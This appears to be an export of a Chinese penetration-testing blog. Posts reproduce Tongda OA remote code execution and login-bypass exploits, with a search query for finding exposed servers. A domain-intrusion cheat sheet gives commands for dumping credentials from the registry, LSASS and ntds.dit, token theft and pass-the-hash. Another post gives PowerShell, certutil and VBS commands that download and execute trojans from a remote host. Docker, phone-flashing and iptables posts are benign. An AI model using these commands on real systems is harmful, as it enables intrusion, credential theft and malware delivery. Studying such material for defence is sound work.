<li>离线解密：<code>链接: https://pan.baidu.com/s/1MHtt3KXVIZAALzZmzTUJeg 密码: tadp</code></li>
<li>在线解密：<code>http://dezend.qiling.org/free.html</code></li>
</ul>
<p><a href="https://github.com/jas502n/OA-tongda-RCE/tree/master/tongda/decode" target="_blank" rel="noopener">解密后的部分代码</a></p>
<h3 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h3><ul>
<li>漏洞主要两个原因，文件上传、文件包含</li>
</ul>
<p><strong>文件上传</strong></p>
<p>ispirit/im/upload.php<br>要上传先要绕过登录认证，但在upload.php修复前，如果变量<code>$P</code>非空则不经过auth.php验证即可执行后续代码</p>
<p><img src="../images/upload/comper.png" alt="代码对比"></p>
<p>上传后的文件不在根目录，所以无法直接利用，需结合文件包含</p>
<p><strong>文件包含</strong></p>
<p>ispirit/interface/gateway.php<br>这里问题在于可以构造json，使其执行<code>include_once</code>代码</p>
<p><img src="../images/upload/sour.png" alt="include"></p>
<h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h3><p>1.上传文件请求</p>
<p><img src="../images/upload/upim.jpg" alt="upload"></p>
<p><a href="../file/upload.txt">命令执行request.txt</a>    <a href="../file/getshell.txt">GetWebshell request.txt</a></p>
<p>2.包含文件执行命令</p>
<p><img src="../images/upload/exec.jpg" alt="exec"></p>
<p><a href="../file/exec.txt">执行命令 request.txt</a></p>
<h3 id="0x05-异常处理"><a href="#0x05-异常处理" class="headerlink" title="0x05 异常处理"></a>0x05 异常处理</h3><ul>
<li><strong>版本路径</strong>：</li>
</ul>
<p>有些版本gateway.php路径不同</p>
<p>例如2013：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure>

<p><strong>例如2017：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;mac&#x2F;gateway.php</span><br><span class="line"></span><br><span class="line">C:\MYOA&gt;dir &#x2F;s &#x2F;b gateway.php</span><br><span class="line">C:\MYOA\webroot\mac\gateway.php</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>上传后无回显：</strong></li>
</ul>
<p><img src="../images/upload/noecho.png" alt="noecho"></p>
<p>部分网站无上传回显，把UPLOAD_MODE参数的值改为1就可以正常拿到上传后的文件名了。</p>
<p><img src="../images/upload/noecho2.png" alt="noecho2"></p>
<ul>
<li><strong>为什么你没成功：</strong></li>
</ul>
<p>我试了许多版本，发现返回<code>2005_xxxxxx</code>的都不能成功，网上复现利用成功的都是<code>2003_xxxxxx</code><br>不知道怎么搞</p>
<hr>
<p><a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">参考链接🔗</a></p>
]]></content>
      <categories>
        <category>通达OA</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA 任意用户登录漏洞复现</title>
    <url>/2020/%E9%80%9A%E8%BE%BEOA1.html</url>
    <content><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>通达OA前台任意用户登录漏洞，影响版本包括通达OA2017、V11.X&lt;V11.5；攻击者利用此漏洞可以接管服务器权限<br><img src="../images/upload/tongd.jpg" alt="OA" style="zoom: 80%;" /></p>
<a id="more"></a>

<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>1.获取code_uid<br>post   /general/login_code.ph 获取code_uid</p>
<p><img src="../images/upload/code_uid.png" alt="example"></p>
<p><a href="../file/code_uid.txt">request.txt</a></p>
<p>2.获取sessionID<br>post  /logincheck_code.php</p>
<p><img src="../images/upload/sessid.jpg" alt="example"></p>
<p><a href="../file/sessionID.txt">requests.txt</a></p>
<p>3.实现登录<br>访问<a href="http://xxxx.com/general/index.php" target="_blank" rel="noopener">http://xxxx.com/general/index.php</a> 利用上一步得到的cookies，<br>通过小饼干🍪等工具替换cookie，刷新页面即可成功进入</p>
<p><img src="../images/upload/admin1.png" alt="example"></p>
<h3 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h3><p><a href="https://github.com/NS-Sp4ce/TongDaOA-FaKe-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-FaKe-User</a></p>
<p>利用POC测试站点，若存在漏洞，返回cookie；利用cookie便可直接登录</p>
<p><img src="../images/upload/poc1.png" alt="poc_result"></p>
<h3 id="0x04-关键词"><a href="#0x04-关键词" class="headerlink" title="0x04 关键词"></a>0x04 关键词</h3><p><a href="https://zoomeye.org" target="_blank" rel="noopener">https://zoomeye.org</a> 中搜索<code>app:&quot;Tongda office anywhere httpd&quot;</code></p>
]]></content>
      <categories>
        <category>通达OA</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透知识备忘</title>
    <url>/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html</url>
    <content><![CDATA[<p>域渗透的一般流程：</p>
<p>入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控 </p>
<h3 id="一、域信息收集"><a href="#一、域信息收集" class="headerlink" title="一、域信息收集"></a>一、域信息收集</h3><p><strong>1、net</strong></p>
<p><code>net user /domain</code>  获取域用户列表<br><code>net group. &quot;domain admins&quot; /doamin</code>  获取域管理员列表<br><code>net group &quot;domain controllers&quot; /domain</code>  查看域控制器(如果有多台)<br><code>net group &quot;domail computers&quot; /domain</code>  查看域机器<br><code>net group /domain</code>  查询域里面的组<a id="more"></a></p>
<p><code>net view</code>  查看同一域内机器列表<br><code>net view \\ip</code>  查看某IP共享<br><code>net view \\GHQ</code>  查看GHQ计算机的共享资源列表<br><code>net view /domain</code>  查看内网存在多少个域<br><code>net view /domain:XYZ</code>  查看XYZ域中的机器列表</p>
<p><strong>2、nltest信任域</strong></p>
<p>查询域间的信任关系<br><code>nettles  /domain_trusts /all_trusts /v /server:192.168.52.2</code><br>返回所有信任192.168.52.2的域</p>
<p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code><br>返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p>
<p>nltest的命令：<br><a href="https://www.cnblogs.com/dreamer-fish/p/3473895.html" target="_blank" rel="noopener">https://www.cnblogs.com/dreamer-fish/p/3473895.html</a></p>
<p><strong>3、nbtscan.exe</strong></p>
<p>扫描网段内是否存在域内机器</p>
<p><code>nbtscan.exe 192.168.52.0/24</code></p>
<p><strong>4、csvde</strong></p>
<p>csvde是windows server 2008的内置命令行工具，如果安装了AD DS或Active Directory轻型目录服务，则功能可用<br><code>csvde -setspn hack -f c:\windows\temp\hack.csv</code><br>LDAP的存储规则：<br>区分名(DN)：一个条目的区分名叫做‘dn’，在一个目录中这个名称总是唯一的<br>CN=Common Name为用户名或服务器名，最长可以到80个字符，可以为中文<br>OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文<br>O=Organization 为组织名，可以3-64个字符长<br>C=Country为国家名，可选，为2个字符长</p>
<p><strong>5、setspn</strong></p>
<p><code>setspn -T 域名 -Q */*</code></p>
<ul>
<li>SPN官方名称即“服务主体名称”，本质上存的是域内各种服务资源的对应关系</li>
<li>如，对应的服务类型是什么，机器名是什么，服务端口是多少</li>
<li>借助SPN可以快速定位当前目标域中所有存活的各类服务器</li>
</ul>
<p>例如查找mssql服务器<br><code>setspn -T 域名 -Q */* | findstr MSSQL</code></p>
<p><strong>6、dnsdump.exe</strong></p>
<p>获取域名其对应的IP地址<br><code>dnsdump.exe -u 域名/域用户 -p 域密码 域控机器名 -r</code></p>
<h3 id="二、域渗透思路"><a href="#二、域渗透思路" class="headerlink" title="二、域渗透思路"></a>二、域渗透思路</h3><h4 id="2-1、注册表读取密码-本地"><a href="#2-1、注册表读取密码-本地" class="headerlink" title="2.1、注册表读取密码-本地"></a>2.1、注册表读取密码-本地</h4><p>​    <strong>1、获取注册表信息</strong>：<br><code>reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</code><br><code>reg save HKLM\SAM c:\windows\temp\Sam.hiv</code></p>
<p>​    <strong>2、mimikatz解密</strong><br><code>lsadump::sam /sam:Sam.hiv /system:Sys.hiv</code></p>
<h4 id="2-2、lsass进程读取内存hash"><a href="#2-2、lsass进程读取内存hash" class="headerlink" title="2.2、lsass进程读取内存hash"></a>2.2、lsass进程读取内存hash</h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p>
<p>​    <strong>1、目标机执行procdump.exe</strong><br><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p>
<p>​    <strong>2、mimikatz中运行,结果保存在日志里</strong><br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
<h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p>
<h4 id="2-4、凭证窃取"><a href="#2-4、凭证窃取" class="headerlink" title="2.4、凭证窃取"></a>2.4、凭证窃取</h4><p>通过tasklist /v查看进程用户，如果有域用户开启的进程，则窃取凭证</p>
<p><code>incognito.exe list_tokens -u</code>  查看目标机当前存储那些凭证<br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code>  使用域用户administrator凭证开启一个cmd</p>
<h4 id="2-5、命令行渗透-IPC连接"><a href="#2-5、命令行渗透-IPC连接" class="headerlink" title="2.5、命令行渗透-IPC连接"></a>2.5、命令行渗透-IPC连接</h4><p>为什么命令后渗透？？<br>1、远程登录桌面增加暴漏风险<br>2、目标管理员可能对服务器禁用远程登录</p>
<ul>
<li>建立ipc连接<br>可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令上传和下载文件直接通过copy命令就可以，<br>不过路径换成UNC路径。以\开头的路径就是UNC路径，比如\192.168.1.1\c$\users</li>
</ul>
<p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code><br>例如：<code>net use \\192.168.1.1 /u:hack\administrator  1q2w3</code></p>
<ul>
<li><p>第二步：上传/下载文件<br>例如：从本地上传1.bat到192.168.1.1机器C盘根目录下<br><code>copy 1.bat \\192.168.1.1\C$\</code></p>
<p>dir、copy、xcopy、move、type的参数都可以使用UNC路径</p>
</li>
</ul>
<h4 id="2-6、命令行渗透-计划任务执行命令"><a href="#2-6、命令行渗透-计划任务执行命令" class="headerlink" title="2.6、命令行渗透-计划任务执行命令"></a>2.6、命令行渗透-计划任务执行命令</h4><ul>
<li><p>创建计划任务<br><code>schtasks /create /tn 任务名 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</code></p>
</li>
<li><p>执行计划任务</p>
<p><code>schtasks /run /tn 任务名 /s 域机器IP /U 域\域用户 -P 域用户密码</code></p>
</li>
<li><p>删除计划任务</p>
<p><code>schtasks /F /delete /tn 任务名 /s 域机器IP /U 域\域用户 /P 域用户密码</code></p>
</li>
</ul>
<p>例如：在192.168.1.1上建立task1任务（以system权限执行cmd程序）<br><code>schtasks /create /tn task1 /U hack\administrator /P 1q2w3e -tr &quot;c:\windows\system32\cms.exe /c whoami &gt; c:\\windows\\temp\\1.txt&quot; /sc ONSTART /s 192.168.1.1 /RU system</code></p>
<h4 id="2-7、命令行渗透-psexec-exe"><a href="#2-7、命令行渗透-psexec-exe" class="headerlink" title="2.7、命令行渗透-psexec.exe"></a>2.7、命令行渗透-psexec.exe</h4><p><strong>知道域账号密码</strong></p>
<ul>
<li><p>建立IPC连接</p>
<p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code></p>
</li>
<li><p>执行命令</p>
<p><code>psexec.exe \\192.168.1.1 -s cmd.exe -accepteula</code><br>-accepteula第一次运行回弹框，输入这个参数便不会弹框；-s 以“nt authority\system”权限运行远程进程</p>
</li>
</ul>
<p><strong>不知明文域账号密码，hash传递</strong></p>
<p><code>psexec_hash.exe -hashes :用户hash 域名\用户名@目标IP</code></p>
<h4 id="2-8、获取内网代理"><a href="#2-8、获取内网代理" class="headerlink" title="2.8、获取内网代理"></a>2.8、获取内网代理</h4><p>内网中有些资源可能需要挂指定<code>代理</code>才能进行访问，一般是<code>IE</code>代理或<code>PAC</code>代理，这两个代理可以通过注册表来读取。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer</span><br><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL</span><br></pre></td></tr></table></figure>

<h3 id="三、Windows-api-利用"><a href="#三、Windows-api-利用" class="headerlink" title="三、Windows api 利用"></a>三、Windows api 利用</h3><p>以下所有利用工具的前提都是已经<code>建立IPC连接</code></p>
<table>
<thead>
<tr>
<th align="left">工具名称</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NetGroupGetUsers.exe</td>
<td align="left">查询域里的各个组里的成员，IP必须是域控IP，域用户随意</td>
</tr>
<tr>
<td align="left">NetLocalGroupGetMembers.exe</td>
<td align="left">查询目标服务器本地管理组的成员</td>
</tr>
<tr>
<td align="left">NetUserEnum.exe</td>
<td align="left">查询目标服务器所有用户，包括隐藏用户</td>
</tr>
</tbody></table>
<p>命令用法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NetGroupGetUsers.exe "domain users" \\192.168.52.2</span><br><span class="line">NetLocalGroupGetMembers.exe \\192.168.52.2</span><br><span class="line">NetUserEnum.exe \\192.168.52.2</span><br></pre></td></tr></table></figure>

<h3 id="四、导域HASH"><a href="#四、导域HASH" class="headerlink" title="四、导域HASH"></a>四、导域HASH</h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p>
<p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx" target="_blank" rel="noopener">官方文档</a>，首先我们要创建一个快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot "activate instance ntds" creat quit quit</span><br></pre></td></tr></table></figure>

<p>接下来我们挂载快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot "mount &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure>

<p>接下来我们复制<code>ntds.dit</code>到本地：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy 装载位置\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure>

<p>接下来我们解除挂载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot "unmount &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure>

<p>最后删除快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot "delete &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure>

<p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br><span class="line">NTDSDdumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</url>
    <content><![CDATA[<p><font color=green>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源，可用于开发，交付和运行应用程序的开放平台。而在安全测试中我们可以利用docker快速搭建出理想环境，进而复现测试漏洞，下面👇我整理出来一些常用命令，作为备忘。</font></p>
<h3 id="0、重点！重点！重点！"><a href="#0、重点！重点！重点！" class="headerlink" title="0、重点！重点！重点！"></a>0、重点！重点！重点！</h3><p>Docker三要素：<font color=red>镜像、容器、仓库</font><br>仓库：集中存放镜像文件的地方；仓库分为公开仓库和私有仓库，目前全世界最大的仓库是Docker官方的 Docker Hub<br>镜像：Docker 镜像（Image），就相当于是一个 root 文件系统。<br>容器：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<a id="more"></a></p>
<h3 id="1、帮助命令："><a href="#1、帮助命令：" class="headerlink" title="1、帮助命令："></a>1、帮助命令：</h3><ul>
<li>查看docker版本信息：docker  version</li>
<li>查看系统相关信息：docker  info</li>
<li>查看docker帮助文档：docker  –help</li>
</ul>
<h3 id="2、镜像命令："><a href="#2、镜像命令：" class="headerlink" title="2、镜像命令："></a>2、镜像命令：</h3><ul>
<li>列出本地主机的镜像：docker  images <pre><code>可选参数：
      -a：所有镜像； 
      -q：只显示镜像ID； 
      --digests：显示镜像摘要信息
      --no-trunc：显示完整的镜像信息</code></pre></li>
<li>搜索某个镜像：docker  search  镜像名 [options]<pre><code>可选参数：
      --no-trunc：显示完整的镜像描述
      -f：按key=value过滤结果
      --limit：限制结果条数,默认25条结果</code></pre></li>
<li>下载某个镜像：docker  pull 镜像名[:TAG]</li>
<li>删除本地镜像：<pre><code>删除单个：docker  rmi  -f 镜像ID
删除多个：docker  rmi -f 镜像名1:TAG 镜像名2:TAG
删除全部：docker  rmi -f $(docker  images  -qa</code></pre></li>
</ul>
<h3 id="3、容器命令："><a href="#3、容器命令：" class="headerlink" title="3、容器命令："></a>3、容器命令：</h3><ul>
<li><p>新建并启动容器：docker  run  [options] 镜像名/imageID<br>常用options选项：</p>
<pre><code>--name=&quot;容器新名字&quot;：为容器指定一个名称
   -d：后台运行容器，并返回容器ID
-i：以交互模式运行容器，通常与-t同时使用
-t：为容器重新分配一个伪输入的终端
-P：随机端口映射
-p：指定端口映射，有以下四种格式
    ip:hostPort:containerPort
    ip::containerPort
    &lt;font color=red&gt;hostPort:containerPort&lt;/font&gt;
    containerPort</code></pre></li>
<li><p>列出运行的容器：docker  ps  [options]<br>常用options选项：</p>
<pre><code>-a :列出当前所有正在运行的容器+历史上运行过的
-l :显示最近创建的容器。
-n：显示最近n个创建的容器。
-q :静默模式，只显示容器编号。
--no-trunc :不截断输出。</code></pre></li>
<li><p>退出容器：<br>exit：容器停止并退出<br>ctrl：容器不停止退出</p>
</li>
<li><p>启动容器：docker start 容器ID/容器名</p>
</li>
<li><p>重启容器：docker restart 容器ID/容器名</p>
</li>
<li><p>停止容器：docker stop 容器ID/容器名</p>
</li>
<li><p>强制停止容器：docker kill 容器ID/容器名</p>
</li>
<li><p>删除停止的容器：docker rm 容器ID<br>一次性删除多个容器：docker  rm -f $(docker ps -qa)</p>
</li>
</ul>
<h3 id="4、其它命令："><a href="#4、其它命令：" class="headerlink" title="4、其它命令："></a>4、其它命令：</h3><ul>
<li>查看容器日志：docker logs -f -t –tail 容器ID<br>-t：显示时间戳<pre><code>-f：跟随最新日志打印
--tail：数字 显示最后多少条</code></pre></li>
<li>查看容器内运行的进程：docker top 容器ID</li>
<li>查看容器内详情：docker inspect 容器ID</li>
<li>进入正运行的容器并以命令行交互：<br>docker exec -it 容器ID /bin/bash</li>
<li>重新进入正运行的容器：<br>docker attach 容器ID<br><font color=red>attach：直接进入容器启动的命令终端，不会启动新的进程；<br>exec：是在容器打开新的终端，并且可以启动新的进程</font></li>
<li>从容器内拷贝文件到主机上：<br>docker cp 容器ID:容器内路径 目的主机路径</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>shell中文件下载方法</title>
    <url>/2020/shell%E4%B8%8B%E8%BD%BD.html</url>
    <content><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p>
<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>)</span><br></pre></td></tr></table></figure>

<p>下载并执行文件：（无文件模式不易检测）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>);<span class="built_in">start-process</span> <span class="string">'C:\test\1.exe'</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul>
<li>保存在当前路径，文件名称同URL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>保存在当前路径，指定保存文件名称</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure>

<p>使用downloader默认在缓存目录位置：保存下载的文件二进制副本。<br><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
<ul>
<li>命令行删除缓存</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure>

<ul>
<li>查看缓存项目</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure>



<h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject("Msxml2.XMLHTTP")</span><br><span class="line">Set Shell = CreateObject("Wscript.Shell")</span><br><span class="line">Post.Open "GET","http://192.168.1.1/1.exe",0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject("ADODB.Stream")</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile "C:\test\1.exe",2</span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>



<h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>

<p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p>
<h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p>
<h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>对下载文件重命名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>限速下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>一加5手机上部署kali nethunter</title>
    <url>/2020/%E4%B8%80%E5%8A%A05%E5%AE%89%E8%A3%85kali%20nethunter.html</url>
    <content><![CDATA[<p>为弘扬中华民族美德-勤俭持家，利用闲暇时间将手中的oneplus 5变废为宝。<br>Kali Linux NetHunter是一个开源的Android渗透测试平台，它可以轻松的使用各种安全工具，详情介绍请查阅官方网站。<br><font color=green>本文章基于oneplus 5手机，其它手机型号方法类似；各项基础知识不在文章赘述范围之内，自行了解；所需全部文件在末尾链接出，下面进入干货环节。</font><a id="more"></a><br><font color=red><strong>数据无价，任何操作前请确认数据已备份</strong>！！！</font></p>
<h4 id="1、刷入新的ROM系统"><a href="#1、刷入新的ROM系统" class="headerlink" title="1、刷入新的ROM系统"></a><strong>1、刷入新的ROM系统</strong></h4><p>国行的一加手机默认使用的是氢OS，而氧OS则自带google全家桶，在应用权限上也有区别，更多两者的区别信息自行查询。<br>1）下载氧OS ROM包；拷入手机根目录</p>
<p><img src="/images/upload/image-20200320005727319.png" alt="">2）手机数据双清操作；关机，然后后按住音量减键和锁屏键进入recovery  mode<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG" >选择清除数据和缓存<br><img width=30% height=10% src="/images/upload/IMG_0561.JPG">然后点击完成！<br>3）刷入氧OS ROM包<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG">点击安装本地升级文件，选中刚刚拷入的ROM包，等待安装完成，如下图<br><img width=30% height=10% src="/images/upload/IMG_0555.JPG"><strong>不要连接网络，会连接google检查更新，先跳过！！</strong></p>
<h4 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a><strong>2、获取ROOT权限</strong></h4><p>1）开启手机开发者模式，打开usb调试选项；打开oem解锁；将手机设置为滑动解锁，通过usb数据线连接电脑<br>2）Windows下载安装mininal adb and fastboot软件<br><img width=30% height=10% src="/images/upload/img_000.png"><img width=50% height=10% src="/images/upload/img_001.png">3）下载第三方Recovery mode；将其放入mininal adb安装目录下，以方便操作<br><img width=30% height=10% src="/images/upload/img_002.png">4）下载Magisk Manager压缩包，拷入手机根目录（使用脸谱获得root权限）<br><img width=30% height=10% src="/images/upload/img_003.png">5）命令行进入adb安装目录；执行如下命令进入recovery mode<br><img width=50% height=10% src="/images/upload/img_004.png">然后点击高级—进入刷机模式<br><img width=50% height=10% src="/images/upload/img_005.png"><img width=50% height=10% src="/images/upload/img_006.jpg">6）然后解锁OEM<br><img width=50% height=10% src="/images/upload/img_007.png">片刻后出现界面，选择unlock the bootloader<img width=50% height=10% src="/images/upload/img_008.jpg"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables常用示例</title>
    <url>/2019/iptables%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B.html</url>
    <content><![CDATA[<p>在早期的Linux系统中，默认使用的是iptables防火墙管理服务来配置防火墙。尽管新型的firewalld防火墙管理服务已经被投入使用多年，但是大量的企业在生产环境中依然出于各种原因而继续使用iptables。所以本文提供了一些常用示例。<a id="more"></a><br>命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]</span>
</pre></td></tr></table></figure>

<p>参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
<span class="line">4</span>
<span class="line">5</span>
<span class="line">6</span>
<span class="line">7</span>
<span class="line">8</span>
<span class="line">9</span>
<span class="line">10</span>
<span class="line">11</span>
<span class="line">12</span>
<span class="line">13</span>
</pre></td><td class="code"><pre><span class="line">-P 设置默认策略:iptables -P INPUT (DROP|ACCEPT)</span>
<span class="line">-F 清空规则链</span>
<span class="line">-L 查看规则链</span>
<span class="line">-A 在规则链的末尾加入新规则</span>
<span class="line">-I num 在规则链的头部加入新规则</span>
<span class="line">-D num 删除某一条规则</span>
